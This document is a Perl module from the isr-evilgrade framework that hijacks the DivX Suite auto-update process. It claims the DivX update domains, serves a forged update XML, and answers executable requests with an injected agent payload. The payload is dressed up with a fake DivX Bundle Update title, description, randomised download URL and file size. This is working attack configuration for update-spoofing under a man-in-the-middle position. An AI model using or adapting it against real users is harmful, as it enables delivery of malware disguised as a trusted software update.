
###############
# divxsuite.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::divxsuite;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'    => 'divxsuite',
    'version' => '1.0',
    'appver'  => '< 6.2',
    'author'  => ['Leandro Costantino < lcostantino +[AT]+ gmail.com>'],
    'description' =>
        qq{DIVX Suite ( Player, WebPlayer, Codec Converter, DrDivX},
    'vh'      => 'versions.divx.com|divx.com|download.divx.com',
    'request' => [
        {   'req' => '/AutoUpdate/AutoUpdate\-[0-9.]+.xml',    #regex friendly
            'type'   => 'file',    #file|string|agent|install
            'method' => '',        #any
            'bin'    => '0',
            'string' => "",
            'parse'  => '1',
            'file' => './include/divxsuite/divxsuite-update.xml',
        },
        {   'req'    => '.exe',     #regex friendly
            'type'   => 'agent',    #file|string|agent|install
            'method' => '',         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },

        'update_engine_version' => {
            'val'  => '1.1.1',
            'desc' => ' DivX Update Engine Version'
        },
        'update_title' => {
            'val'  => ' DivX Bundle Update',
            'desc' => ' Update title '
        },
        'version' => {
            'val'  => '10.1.1',
            'desc' => 'Product Version'
        },
        'description' => {
            'val' =>
                'Upgrade to DivX 6 and experience the new DivX Player, DivX Codec and DivX
                                                 Converter. Experience a new level of video quality, advanced media features
                                                 and one-click conversion to DivX video.[br][br]
                                                 [a href="http://go.divx.com/divx/create/overview/en"]Read more[/a]',
            'desc' => ' Update Description'
        },
        'state' => {
            'val'         => 'free',
            'description' => ' free / pro / trial . Update app type '
        },
        'url' => {
            'val' =>
                "'http://versions.divx.com/divx/autoupdateC/'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1)).'.exe'",
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'size' => {
            'val'     => " '2'.isrcore::utils::RndNum(7) ",
            'dynamic' => 1
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
